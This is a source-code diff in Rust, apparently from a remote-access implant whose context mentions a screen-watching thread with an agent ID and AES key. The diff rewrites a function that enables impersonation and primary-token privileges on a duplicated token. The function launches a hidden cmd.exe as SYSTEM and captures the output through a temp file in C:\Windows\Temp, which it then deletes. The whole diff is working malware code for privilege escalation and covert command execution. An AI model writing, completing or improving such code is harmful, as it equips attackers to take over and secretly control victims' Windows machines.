@@ -159,41 +159,18 @@ fn spawn_screenwatch_thread(agent_id: String, aes_key: Vec<u8>, interval_sec: u6
 unsafe fn shell_as_system(cmd: &str, token: isize) -> String {
     fn to_wide(s: &str) -> Vec<u16> { s.encode_utf16().chain(std::iter::once(0)).collect() }
 
-    // Keep the command line separate from the application path and capture
-    // stdout/stderr through an anonymous pipe.  A temporary file made the
-    // old implementation report an empty result even when process creation
-    // failed and left stale files in C:\Users\Public.
-    let shell_args = format!("/d /c {} 2>&1", cmd);
+    // Redirect output via '>' in the command line instead of passing pipe
+    // handles through STARTF_USESTDHANDLES.  CreateProcessWithTokenW goes
+    // through seclogon which cannot duplicate pipe handles across session
+    // boundaries, causing STATUS_DLL_INIT_FAILED in the child process.
+    use std::sync::atomic::{AtomicU64, Ordering};
+    static SEQ: AtomicU64 = AtomicU64::new(0);
+    let uid = ((std::process::id() as u64) << 32) | SEQ.fetch_add(1, Ordering::Relaxed);
+    let out_path = format!(r"C:\Windows\Temp\sbo{:016x}.tmp", uid);
+    let shell_args = format!("/d /c {} > \"{}\" 2>&1", cmd, out_path);
     let mut wargs = to_wide(&shell_args);
     let mut wargs_as_user = to_wide(&shell_args);
-    let sa = SECURITY_ATTRIBUTES {
-        nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
-        lpSecurityDescriptor: std::ptr::null_mut(),
-        bInheritHandle: 1,
-    };
-    let mut hread = 0isize;
-    let mut hwrite = 0isize;
-    if CreatePipe(&mut hread, &mut hwrite, &sa, 0) == 0 {
-        return format!("[error: CreatePipe {}]", GetLastError());
-    }
-    if SetHandleInformation(hread, HANDLE_FLAG_INHERIT, 0) == 0 {
-        let e = GetLastError();
-        CloseHandle(hread); CloseHandle(hwrite);
-        return format!("[error: SetHandleInformation {}]", e);
-    }
 
-    let mut si: STARTUPINFOW = std::mem::zeroed();
-    si.cb          = std::mem::size_of::<STARTUPINFOW>() as u32;
-    si.dwFlags     = STARTF_USESTDHANDLES | 0x0000_0001; // STARTF_USESHOWWINDOW
-    si.wShowWindow = 0; // SW_HIDE
-    si.hStdInput   = 0;
-    si.hStdOutput  = hwrite;
-    si.hStdError   = hwrite;
-    let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
-
-    // Prepare privileges on the caller and on the duplicated primary token.
-    // Failures are retained in the launch diagnostics; filtered tokens may
-    // legitimately lack one of these privileges.
     let mut self_tok = 0isize;
     if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut self_tok) != 0 {
         enable_priv(self_tok, "SeImpersonatePrivilege");
@@ -204,6 +181,13 @@ unsafe fn shell_as_system(cmd: &str, token: isize) -> String {
     enable_priv_token(token, "SeImpersonatePrivilege");
     enable_priv_token(token, "SeIncreaseQuotaPrivilege");
     enable_priv_token(token, "SeAssignPrimaryTokenPrivilege");
+
+    // No STARTF_USESTDHANDLES — the child writes its own output file.
+    let mut si: STARTUPINFOW = std::mem::zeroed();
+    si.cb          = std::mem::size_of::<STARTUPINFOW>() as u32;
+    si.dwFlags     = 0x0000_0001; // STARTF_USESHOWWINDOW
+    si.wShowWindow = 0; // SW_HIDE
+    let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
 
     let app = to_wide(r"C:\Windows\System32\cmd.exe");
     let cwd = to_wide(r"C:\Windows\System32");
@@ -217,7 +201,7 @@ unsafe fn shell_as_system(cmd: &str, token: isize) -> String {
     if proc_ok == 0 {
         proc_ok = CreateProcessAsUserW(
             token, app.as_ptr(), wargs_as_user.as_mut_ptr(),
-            std::ptr::null(), std::ptr::null(), 1, CREATE_NO_WINDOW,
+            std::ptr::null(), std::ptr::null(), 0, CREATE_NO_WINDOW,
             std::ptr::null(), cwd.as_ptr(), &si, &mut pi,
         );
         if proc_ok == 0 { as_user_err = GetLastError(); }
@@ -235,58 +219,22 @@ unsafe fn shell_as_system(cmd: &str, token: isize) -> String {
             RevertToSelf();
         }
     }
-    CloseHandle(hwrite); // child owns the duplicated std handles
     if proc_ok == 0 {
-        CloseHandle(hread);
         return format!("[error: SYSTEM shell launch; WithToken={}; AsUser={}; Impersonate={}]",
                        with_token_err, as_user_err, impersonate_err);
     }
 
-    let mut output = Vec::<u8>::new();
-    let mut buf = [0u8; 4096];
-    let started = std::time::Instant::now();
-    let mut exit_code = 259u32; // STILL_ACTIVE
-    let mut timed_out = false;
-    loop {
-        let mut avail = 0u32;
-        if PeekNamedPipe(hread, std::ptr::null_mut(), 0, std::ptr::null_mut(),
-                         &mut avail, std::ptr::null_mut()) != 0 && avail > 0 {
-            let mut nr = 0u32;
-            let want = avail.min(buf.len() as u32);
-            if ReadFile(hread, buf.as_mut_ptr(), want, &mut nr, std::ptr::null()) != 0 && nr > 0 {
-                output.extend_from_slice(&buf[..nr as usize]);
-                continue;
-            }
-        }
-        if GetExitCodeProcess(pi.hProcess, &mut exit_code) != 0 && exit_code != 259 {
-            // Drain bytes buffered between the last peek and process exit.
-            loop {
-                avail = 0;
-                if PeekNamedPipe(hread, std::ptr::null_mut(), 0, std::ptr::null_mut(),
-                                 &mut avail, std::ptr::null_mut()) == 0 || avail == 0 { break; }
-                let mut nr = 0u32;
-                let want = avail.min(buf.len() as u32);
-                if ReadFile(hread, buf.as_mut_ptr(), want, &mut nr, std::ptr::null()) == 0 || nr == 0 { break; }
-                output.extend_from_slice(&buf[..nr as usize]);
-            }
-            break;
-        }
-        if started.elapsed() >= std::time::Duration::from_secs(60) {
-            timed_out = true;
-            TerminateProcess(pi.hProcess, 1);
-            break;
-        }
-        std::thread::sleep(std::time::Duration::from_millis(10));
-    }
-    CloseHandle(hread);
+    WaitForSingleObject(pi.hProcess, 60_000);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
-    if timed_out && output.is_empty() { return "[error: SYSTEM shell capture timed out]".into(); }
-    if output.is_empty() {
-        return format!("[error: SYSTEM shell capture empty; exit={}; WithToken={}; AsUser={}]",
-                       exit_code, with_token_err, as_user_err);
+
+    let out = std::fs::read(&out_path).unwrap_or_default();
+    let _ = std::fs::remove_file(&out_path);
+    if out.is_empty() {
+        return format!("[error: SYSTEM shell capture empty; WithToken={}; AsUser={}]",
+                       with_token_err, as_user_err);
     }
-    String::from_utf8_lossy(&output).into_owned()
+    String::from_utf8_lossy(&out).into_owned()
 }
 
 #[cfg(target_os = "windows")]
@@ -460,8 +408,6 @@ use windows_sys::Win32::Storage::FileSystem::{
     FILE_FLAG_OVERLAPPED, PIPE_ACCESS_DUPLEX,
 };
 #[cfg(target_os = "windows")]
-use windows_sys::Win32::Foundation::HANDLE_FLAG_INHERIT;
-#[cfg(target_os = "windows")]
 use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::System::Pipes::{
@@ -475,30 +421,11 @@ use windows_sys::Win32::Foundation::WAIT_OBJECT_0;
 use windows_sys::Win32::System::Threading::{
     CreateEventW, WaitForSingleObject, GetCurrentThreadId,
     CreateProcessWithTokenW, OpenThreadToken, GetCurrentThread,
-    STARTUPINFOW, CREATE_NO_WINDOW, STARTF_USESTDHANDLES,
+    STARTUPINFOW, CREATE_NO_WINDOW,
 };
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::Security::TOKEN_IMPERSONATE;
 
-#[cfg(target_os = "windows")]
-#[link(name = "kernel32")]
-extern "system" {
-    fn CreatePipe(
-        h_read: *mut isize, h_write: *mut isize,
-        attrs: *const SECURITY_ATTRIBUTES, size: u32,
-    ) -> i32;
-    fn SetHandleInformation(handle: isize, mask: u32, flags: u32) -> i32;
-    fn ReadFile(
-        handle: isize, buffer: *mut u8, count: u32,
-        read: *mut u32, overlapped: *const core::ffi::c_void,
-    ) -> i32;
-    fn PeekNamedPipe(
-        pipe: isize, buffer: *mut u8, size: u32, read: *mut u32,
-        available: *mut u32, left: *mut u32,
-    ) -> i32;
-    fn GetExitCodeProcess(process: isize, exit_code: *mut u32) -> i32;
-    fn TerminateProcess(process: isize, exit_code: u32) -> i32;
-}
 
 #[cfg(target_os = "windows")]
 #[link(name = "advapi32")]
